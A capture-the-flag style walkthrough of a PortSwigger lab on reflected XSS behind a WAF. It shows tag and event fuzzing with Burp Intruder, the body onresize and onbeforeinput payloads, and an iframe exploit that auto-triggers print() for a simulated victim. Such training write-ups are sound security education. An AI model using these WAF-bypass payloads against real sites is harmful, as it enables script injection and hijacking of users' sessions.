# Lab: Reflected XSS into HTML context with most tags and attributes blocked

This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.

# Step 1 Inspect the search funtionality of the web app

## reflected input

When I search a string:

![image](https://user-images.githubusercontent.com/83407557/211039207-056b7060-6729-4ad6-98d2-63b8a1fcf337.png)

I can see that string reflected on the page

![image](https://user-images.githubusercontent.com/83407557/211039478-74932344-9507-4646-b457-3530f00c5024.png)


## Breakout

I can try and break out of the single quotes and add my own html tag (h2)

![image](https://user-images.githubusercontent.com/83407557/211039838-febb8708-6b34-47fe-a9c6-e9b6b47be9a6.png)

![image](https://user-images.githubusercontent.com/83407557/211039885-06c5f4ed-e7b8-4f63-bf13-9f80dbf31e3c.png)

And I find that breaking out and adding a new element is possible:

![image](https://user-images.githubusercontent.com/83407557/211040011-7c1a4416-1b10-490c-b248-9d6f320d3df0.png)

## Attempt XSS

If I try a script tag I see that it is blocked:

![image](https://user-images.githubusercontent.com/83407557/211040234-e80ddc28-d0b7-472e-b47d-7e043eaaf7f7.png)

I get the following error:

![image](https://user-images.githubusercontent.com/83407557/211040376-72880416-656f-416d-981d-846808d9bbde.png)

# Step 2 Find allowed tags

I want to create a intruder attack that goes through all potential tags and see which ones (if any) are not blocked, so I send the blocked request to repeater and set the payload positions on the word "script" (the tag)

![image](https://user-images.githubusercontent.com/83407557/211041027-bb710d3a-772e-4bb7-9dcd-6923e7cb81f0.png)

I then go to portswigger's [XSS Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and copy all tags to clipboard:

![image](https://user-images.githubusercontent.com/83407557/211041382-bd7611d5-a9ed-4a5b-8993-6d40b5816403.png)

I then paste these tags as my payload for the intruder attack:

![image](https://user-images.githubusercontent.com/83407557/211041521-b4d3cc98-b62c-45e5-b3a8-3bd582e8f041.png)

I see that only custom tags, and body are allowed as they are the only ones that had 200 resonse codes

![image](https://user-images.githubusercontent.com/83407557/211041744-442391cc-c369-452c-b549-88e17a55f351.png)

# Step 3 attempt XSS with body tag

Since I know the body tag will go through I find a payload on the cheat sheet to test

![image](https://user-images.githubusercontent.com/83407557/211042460-89330dd8-af34-4dbd-85da-e1acd5355ddb.png)

I then create a payload to fit the context of the vulnerable search bar:

```html
'<body onerror=alert(1) onload=/></body>
```

![image](https://user-images.githubusercontent.com/83407557/211042964-12617799-7a72-4d52-b3a7-40cb1c9f09a0.png)

However now I get an error that says the attribute is not allowed

![image](https://user-images.githubusercontent.com/83407557/211043144-80b26d76-4d31-496f-8bcb-3cf092b8e096.png)

# Step 4 find an allowed attribute

To test I want to create another intruder attack, First I make a payload that is just a body tag with a single disallowed attribute:

```html
<body onload=alert(1)>
```
![image](https://user-images.githubusercontent.com/83407557/211043872-42f76e51-6276-4117-9ed3-d1c854984b14.png)

It errors, but I just wanted to request to send to intruder:

![image](https://user-images.githubusercontent.com/83407557/211044006-23a70422-5bc5-4dc4-8351-e4dbeda217c1.png)

I set a payload position on the onload attribute that was blocked:

![image](https://user-images.githubusercontent.com/83407557/211044168-415f9381-134f-497d-803f-da59d67fafc9.png)

Then I copy all events to clipboard from the [XSS Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

![image](https://user-images.githubusercontent.com/83407557/211044390-1991fae7-88d8-4ccb-af49-e643224595e2.png)

I then add these as my intruder attack payloads:

![image](https://user-images.githubusercontent.com/83407557/211044526-b659632d-0859-48ec-b346-ac5cc0aaf4d4.png)

Again only two returned 200 ok status codes, onbeforeinput and onresize:

![image](https://user-images.githubusercontent.com/83407557/211044768-e96e678c-75c4-42c0-af04-74fbbc7f7e9f.png)

**onbeforeinput**
![image](https://user-images.githubusercontent.com/83407557/211045084-6e423626-75e7-4c5b-9649-54909353542b.png)

```html
<body contenteditable onbeforeinput=alert(1)>test
```

**onresize**
![image](https://user-images.githubusercontent.com/83407557/211045316-be8dcc58-2257-484f-9f67-34f8dfdb2215.png)


```html
<body onresize="print()">
```

# Step 5 Test the two found payloads

## Testing onbeforeinput:

![image](https://user-images.githubusercontent.com/83407557/211045794-70887f9b-8577-45ef-84cc-7d50c5eda532.png)

I do get a pop-up, however I need to start typing in the search bar for it to fire (meaning that I would need at least some user input)

![image](https://user-images.githubusercontent.com/83407557/211045990-9bcc8996-f6cf-49a3-9fa0-5e9e646408fe.png)

## Testing onresize

![image](https://user-images.githubusercontent.com/83407557/211046211-b8f103e4-f8a8-413c-9546-a705ce6bce0f.png)

I also get a pop-up, but only if I try and resize the window:

![image](https://user-images.githubusercontent.com/83407557/211046438-1feed8ab-8804-4733-b100-678d51f5d86d.png)

# Step 6 Create exploit

However, I can cause a window to resize with an iframe from the attack server that will auto resize the window

```html
<iframe src="https://0a6d00f004d05e7dc1c2da3900f300a7.web-security-academy.net/?search=%27%3Cbody+onresize%3D%22alert%281%29%22%3E%3C%2Fbody%3E" onload=this.style.width='100px'>
```

Saving the above payload in the body of /exploit on my attack server:

![image](https://user-images.githubusercontent.com/83407557/211052439-cb69e70a-b177-4fe5-8ead-8415056e83c8.png)

When I view the exploit I get a pop-up with no interaction required:

![image](https://user-images.githubusercontent.com/83407557/211052563-82f9e5e4-1e3f-410b-b687-b99027255cc8.png)

# Step 7 update exploit 

Since the goal is not to have an alert pop-up, I need to edit the exploit to have print() instead of alert(1)

```html
<iframe src="https://0a6d00f004d05e7dc1c2da3900f300a7.web-security-academy.net/?search=%27%3Cbody+onresize%3D%22print%28%29%22%3E%3C%2Fbody%3E" onload=this.style.width='100px'>
```

I store the modified exploit

![image](https://user-images.githubusercontent.com/83407557/211052925-7018b0c9-5d6b-4d17-87d6-dedd17fee7f0.png)

And view it again to test on myself, and verify it tries to print the page:

![image](https://user-images.githubusercontent.com/83407557/211053017-378cc7e7-a80f-4740-900b-52068a180e43.png)

# Step 8 send exploit to victim

Now instead of viewing it myself, I send the exploit to the victim:

![image](https://user-images.githubusercontent.com/83407557/211053171-d4617270-8dad-465c-924a-4f36cf44a276.png)

which solves the lab

![image](https://user-images.githubusercontent.com/83407557/211053236-b16097a2-ebc5-47db-9295-511e422fa9f6.png)
